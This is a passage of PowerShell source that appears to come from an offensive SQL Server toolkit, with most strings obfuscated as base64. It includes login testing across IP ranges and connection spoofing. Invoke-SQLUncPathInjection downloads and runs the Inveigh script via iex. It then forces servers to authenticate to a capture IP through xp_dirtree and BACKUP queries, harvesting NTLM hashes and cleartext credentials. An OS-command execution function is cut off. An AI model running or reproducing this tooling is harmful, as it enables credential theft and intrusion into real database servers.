
Function Get-SQLConnectionObject
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Dedicated Administrator Connection (DAC).')]
        [Switch]$DAC,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the application your connecting to the server with.')]
        [string]$AppName = "",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the workstation/hostname your connecting to the server with.')]
        [string]$WorkstationId = "",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use an encrypted connection.')]
        [ValidateSet("Yes","No","")]
        [string]$Encrypt = "",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Trust the certificate of the remote server.')]
        [ValidateSet("Yes","No","")]
        [string]$TrustServerCert = "",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut = 1
    )
    Begin
    {
        if($DAC)
        {
            $DacConn = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAE0ASQBOADoA')))
        }
        else
        {
            $DacConn = ''
        }
        if(-not $Database)
        {
            $Database = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHMAdABlAHIA')))
        }
        if($AppName){
            $AppNameString = ";Application Name=`"$AppName`""
        }else{
            $AppNameString = ""
        }
        if($WorkstationId){
            $WorkstationString = ";Workstation Id=`"$WorkstationId`""
        }else{
            $WorkstationString = ""
        }
        if($Encrypt){
            $EncryptString = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OwBFAG4AYwByAHkAcAB0AD0AWQBlAHMA')))
        }else{
            $EncryptString = ""
        }
        if($TrustServerCert){
            $TrustCertString = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OwBUAHIAdQBzAHQAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAD0AWQBlAHMA')))
        }else{
            $TrustCertString = ""
        }
    }
    Process
    {
        if ( -not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $Connection = New-Object -TypeName System.Data.SqlClient.SqlConnection
        if(-not $Username){
            $AuthenticationType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwB1AHIAcgBlAG4AdAAgAFcAaQBuAGQAbwB3AHMAIABDAHIAZQBkAGUAbgB0AGkAYQBsAHMA')))
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;Integrated Security=SSPI;Connection Timeout=1$AppNameString$EncryptString$TrustCertString$WorkstationString"
        }
        if ($username -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBcACoA')))){
            $AuthenticationType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQBkACAAVwBpAG4AZABvAHcAcwAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA=')))
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;Integrated Security=SSPI;uid=$Username;pwd=$Password;Connection Timeout=$TimeOut$AppNameString$EncryptString$TrustCertString$WorkstationString"
        }
        if (($username) -and ($username -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBcACoA'))))){
            $AuthenticationType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQBkACAAUwBRAEwAIABMAG8AZwBpAG4A')))
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;User ID=$Username;Password=$Password;Connection Timeout=$TimeOut$AppNameString$EncryptString$TrustCertString$WorkstationString"
        }
        return $Connection
    }
    End
    {
    }
}
Function  Get-SQLConnectionTest
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
            ValueFromPipeline = $true,
            ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'IP Address of SQL Server.')]
        [string]$IPAddress,
        [Parameter(Mandatory = $false,
        HelpMessage = 'IP Address Range In CIDR Format to Audit.')]
        [string]$IPRange,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMA'))))
    }
    Process
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if($IPRange -and $IPAddress)
        {
            if ($IPAddress.Contains(","))
            {
                $ContainsValid = $false
                foreach ($IP in $IPAddress.Split(","))
                {
                    if($(Test-Subnet -cidr $IPRange -ip $IP))
                    {
                        $ContainsValid = $true
                    }
                }
                if (-not $ContainsValid)
                {
                    Write-Warning "Skipping $ComputerName ($IPAddress)"
                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAIABvAGYAIABTAGMAbwBwAGUA'))))
                    return
                }
            }
            if(-not $(Test-Subnet -cidr $IPRange -ip $IPAddress))
            {
                Write-Warning "Skipping $ComputerName ($IPAddress)"
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAIABvAGYAIABTAGMAbwBwAGUA'))))
                return
            }
            Write-Verbose "$ComputerName ($IPAddress)"
        }
        if($DAC)
        {
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
        }
        else
        {
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
        }
        try
        {
            $Connection.Open()
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
            $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA='))))
            $Connection.Close()
            $Connection.Dispose()
        }
        catch
        {
            if(-not $SuppressVerbose)
            {
                $ErrorMessage = $_.Exception.Message
                Write-Verbose -Message "$Instance : Connection Failed."
                Write-Verbose  -Message " Error: $ErrorMessage"
            }
            $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABBAGMAYwBlAHMAcwBpAGIAbABlAA=='))))
        }
    }
    End
    {
        $TblResults
    }
}
Function  Get-SQLConnectionTestThreaded
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
            ValueFromPipeline = $true,
            ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'IP Address of SQL Server.')]
        [string]$IPAddress,
        [Parameter(Mandatory = $false,
        HelpMessage = 'IP Address Range In CIDR Format to Audit.')]
        [string]$IPRange,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 5,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMA'))))
        $PipelineItems = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance;
            }
        }
        if($Instance -and $IPAddress)
        {
            $ProvideInstance | Add-Member -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) -Value $IPAddress
        }
        $PipelineItems = $PipelineItems + $ProvideInstance
    }
    Process
    {
        $PipelineItems = $PipelineItems + $_
    }
    End
    {
        $MyScriptBlock = {
            $Instance = $_.Instance
            $IPAddress = $_.IPAddress
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if($IPRange -and $IPAddress)
            {
                if ($IPAddress.Contains(","))
                {
                    $ContainsValid = $false
                    foreach ($IP in $IPAddress.Split(","))
                    {
                        if($(Test-Subnet -cidr $IPRange -ip $IP))
                        {
                            $ContainsValid = $true
                        }
                    }
                    if (-not $ContainsValid)
                    {
                        Write-Warning "Skipping $ComputerName ($IPAddress)"
                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAIABvAGYAIABTAGMAbwBwAGUA'))))
                        return
                    }
                }
                if(-not $(Test-Subnet -cidr $IPRange -ip $IPAddress))
                {
                    Write-Warning "Skipping $ComputerName ($IPAddress)"
                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAIABvAGYAIABTAGMAbwBwAGUA'))))
                    return
                }
                Write-Verbose "$ComputerName ($IPAddress)"
            }
            if($DAC)
            {
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
            }
            else
            {
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
            }
            try
            {
                $Connection.Open()
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA='))))
                $Connection.Close()
                $Connection.Dispose()
            }
            catch
            {
                if(-not $SuppressVerbose)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                }
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABBAGMAYwBlAHMAcwBpAGIAbABlAA=='))))
            }
        }
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return $TblResults
    }
}
Function Get-SQLQuery
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server query.')]
        [string]$Query,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [int]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the application your connecting to the server with.')]
        [string]$AppName = "",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the workstation/hostname your connecting to the server with.')]
        [string]$WorkstationId = "",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use an encrypted connection.')]
        [ValidateSet("Yes","No","")]
        [string]$Encrypt = "",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Trust the certificate of the remote server.')]
        [ValidateSet("Yes","No","")]
        [string]$TrustServerCert = "",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Return error message if exists.')]
        [switch]$ReturnError
    )
    Begin
    {
        $TblQueryResults = New-Object -TypeName System.Data.DataTable
    }
    Process
    {
        if($DAC)
        {
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -DAC -Database $Database -AppName $AppName -WorkstationId $WorkstationId -Encrypt $Encrypt -TrustServerCert $TrustServerCert
        }
        else
        {
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database -AppName $AppName -WorkstationId $WorkstationId -Encrypt $Encrypt -TrustServerCert $TrustServerCert
        }
        $ConnectionString = $Connection.Connectionstring
        $Instance = $ConnectionString.split(';')[0].split('=')[1]
        if($Query)
        {
            try
            {
                $Connection.Open()
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }
                $Command = New-Object -TypeName System.Data.SqlClient.SqlCommand -ArgumentList ($Query, $Connection)
                $Results = $Command.ExecuteReader()
                $TblQueryResults.Load($Results)
                $Connection.Close()
                $Connection.Dispose()
            }
            catch
            {
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Failed."
                }
                if($ReturnError)
                {
                    $ErrorMessage = $_.Exception.Message
                }
            }
        }
        else
        {
            echo -InputObject $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcQB1AGUAcgB5ACAAcAByAG8AdgBpAGQAZQBkACAAdABvACAARwBlAHQALQBTAFEATABRAHUAZQByAHkAIABmAHUAbgBjAHQAaQBvAG4ALgA=')))
            Break
        }
    }
    End
    {
        if($ReturnError)
        {
            $ErrorMessage
        }
        else
        {
            $TblQueryResults
        }
    }
}
Function  Get-SQLQueryThreaded
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,
        [Parameter(Mandatory = $true,
        HelpMessage = 'Query to be executed.')]
        [String]$Query,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 5,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblResults = New-Object -TypeName System.Data.DataTable
        $PipelineItems = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        $PipelineItems = $PipelineItems + $ProvideInstance
    }
    Process
    {
        $PipelineItems = $PipelineItems + $_
    }
    End
    {
        $MyScriptBlock = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if($DAC)
            {
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
            }
            else
            {
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
            }
            try
            {
                $Connection.Open()
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }
                $Command = New-Object -TypeName System.Data.SqlClient.SqlCommand -ArgumentList ($Query, $Connection)
                $Results = $Command.ExecuteReader()
                $TblResults.Load($Results)
                $Connection.Close()
                $Connection.Dispose()
            }
            catch
            {
                if(-not $SuppressVerbose)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                }
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABBAGMAYwBlAHMAcwBpAGIAbABlAA=='))))
            }
        }
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return $TblResults
    }
}
Function Invoke-SQLUncPathInjection {
    [CmdletBinding()]
    Param(
      [Parameter(Mandatory=$false)]
       [string]$Username,
       [Parameter(Mandatory=$false)]
       [string]$Password,
       [Parameter(Mandatory=$false)]
       [string]$DomainController,
       [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
       HelpMessage = 'SQL Server instance to connection to.')]
       [string]$Instance,
       [Parameter(Mandatory=$true)]
       [string]$CaptureIp,
       [Parameter(Mandatory=$false)]
       [int]$TimeOut = 5,
       [Parameter(Mandatory=$false)]
       [int]$Threads = 10
    )
    Begin 
    {
        try {
            iex -Command (New-Object -TypeName system.net.webclient).downloadstring($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBLAGUAdgBpAG4ALQBSAG8AYgBlAHIAdABzAG8AbgAvAEkAbgB2AGUAaQBnAGgALwBtAGEAcwB0AGUAcgAvAEkAbgB2AGUAaQBnAGgALgBwAHMAMQA=')))) -ErrorAction Stop
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgAGwAbwBhAGQAZQBkAA==')))
        } catch {
            $ErrorMessage = $_.Exception.Message
            Write-Verbose "$ErrorMessage"
            $Loaded = Test-Path -Path Function:\Invoke-Inveigh
            if($Loaded -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAZQA='))))
            {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgAGwAbwBhAGQAZQBkAC4A')))
            }else{
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgAE4ATwBUACAAbABvAGEAZABlAGQALgAgAEUAbgBzAHUAcgBlACAASQBuAHYAZQBpAGcAaAAgAGkAcwAgAGwAbwBhAGQAZQBkAC4A')))
                break
            }
        }
        $TblInveigh = New-Object -TypeName System.Data.DataTable
        $null = $TblInveigh.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGUAYQByAHQAZQB4AHQA'))))
        $null = $TblInveigh.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQATgBUAEwATQB2ADEA'))))
        $null = $TblInveigh.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQATgBUAEwATQB2ADIA'))))
    }
    Process
    {
        $CurrentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $prp = New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($CurrentIdentity)                        
        $adm = [System.Security.Principal.WindowsBuiltInRole]::Administrator
        $IsAdmin = $prp.IsInRole($adm)
        if (-not $IsAdmin)
        {
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABkAG8AIABuAG8AdAAgAGgAYQB2AGUAIABBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACAAcgBpAGcAaAB0AHMALgAgAFIAdQBuACAAdABoAGkAcwAgAGYAdQBuAGMAdABpAG8AbgAgAGkAbgAgAGEAIABwAHIAaQB2AGkAbABlAGcAZQBkACAAcAByAG8AYwBlAHMAcwAgAGYAbwByACAAYgBlAHMAdAAgAHIAZQBzAHUAbAB0AHMALgA=')))                            
        }
        else
        {
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABoAGEAdgBlACAAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAgAHIAaQBnAGgAdABzAC4A')))
        }
        if(-not $Instance)
        {
            $SQLServerInstances = Get-SQLInstanceDomain -verbose -DomainController $DomainController -Username $Username -Password $Password 
        } else {
            $SQLServerInstances = $Instance 
        }
        Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAGwAbwBnACAAaQBuAHQAbwAgAGUAYQBjAGgAIABpAG4AcwB0AGEAbgBjAGUALgAuAC4A')))
        $AccessibleSQLServers = $SQLServerInstances | Get-SQLConnectionTestThreaded -Verbose -Threads $Threads | ? {$_.status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))}        
        $AccessibleSQLServersCount = $AccessibleSQLServers.count
        Write-Verbose -Message "$AccessibleSQLServersCount SQL Server instances can be logged into"
        Write-Verbose -Message "Starting UNC path injections against $AccessibleSQLServersCount instances..."
        Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AGkAbgBnACAASQBuAHYAbwBrAGUALQBJAG4AdgBlAGkAZwBoAC4ALgAuAA==')))
        Invoke-Inveigh -NBNS Y -MachineAccounts Y -IP $CaptureIp | Out-Null
        $AccessibleSQLServers | 
        %{
            $CurrentInstance = $_.Instance
            $UncFileName = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))
            Write-Verbose -Message "$CurrentInstance - Injecting UNC path to \\$CaptureIp\$UncFileName"
            $SQLVersionFull = Get-SQLServerInfo -Instance $CurrentInstance -Username $Username -Password $Password -SuppressVerbose | select -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
            if($SQLVersionFull)
            {
                $SQLVersionShort = $SQLVersionFull.Split('.')[0]
            }
            if([int]$SQLVersionShort -le 11)
            {
                Get-SQLQuery -Instance $CurrentInstance -Username $Username -Password $Password -Query "BACKUP LOG [TESTING] TO DISK = '\\$CaptureIp\$UncFileName'" -SuppressVerbose | out-null
                Get-SQLQuery -Instance $CurrentInstance -Username $Username -Password $Password -Query "BACKUP DATABASE [TESTING] TO DISK = '\\$CaptureIp\$UncFileName'" -SuppressVerbose | out-null
            }
            Get-SQLQuery -Instance $CurrentInstance -Username $Username -Password $Password -Query "xp_dirtree '\\$CaptureIp\$UncFileName'" -SuppressVerbose | out-null 
            Get-SQLQuery -Instance $CurrentInstance -Username $Username -Password $Password -Query "xp_fileexist '\\$CaptureIp\$UncFileName'" -SuppressVerbose | out-null
            sleep $TimeOut
            Get-Inveigh -Cleartext | sort |
            % {
                Write-Verbose -Message " - Cleartext: $_"
            }
            Get-Inveigh -NTLMv1 | sort |
            % {
                Write-Verbose -Message " - NetNTLMv1: $_"
            }
            Get-Inveigh -NTLMv2 | sort |
            % {
                Write-Verbose -Message " - NetNTLMv2: $_"
            }
        }
    }
    End
    {
            Get-Inveigh -Cleartext | sort |
            % {
                [string]$NTLMv1 = ""
                [string]$NTLMv2 = ""
                [string]$Cleartext = $_
                $null = $TblInveigh.Rows.Add([string]$Cleartext, [string]$NTLMv1, [string]$NTLMv2)            
            }
            Get-Inveigh -NTLMv1 | sort |
            % {
                [string]$NTLMv1 = $_
                [string]$NTLMv2 = ""
                [string]$Cleartext = ""
                $null = $TblInveigh.Rows.Add([string]$Cleartext, [string]$NTLMv1, [string]$NTLMv2)            
            }
            Get-Inveigh -NTLMv2 | sort |
            % {
                [string]$NTLMv1 = ""
                [string]$NTLMv2 = $_
                [string]$Cleartext = ""
                $null = $TblInveigh.Rows.Add([string]$Cleartext, [string]$NTLMv1, [string]$NTLMv2)            
            }
        Clear-Inveigh | Out-Null
        Stop-Inveigh | Out-Null
        $TblInveigh
    }
}
Function  Invoke-SQLOSCmd
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $true,
        HelpMessage = 'OS command to be executed.')]
        [String]$Command,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Just show the raw results without the computer or instance name.')]
        [switch]$RawResults
    )
    Begin
    {
        $TblCommands = New-Object -TypeName System.Data.DataTable
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZABSAGUAcwB1AGwAdABzAA=='))))
        $PipelineItems = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        $PipelineItems = $PipelineItems + $ProvideInstance
    }
    Process
    {
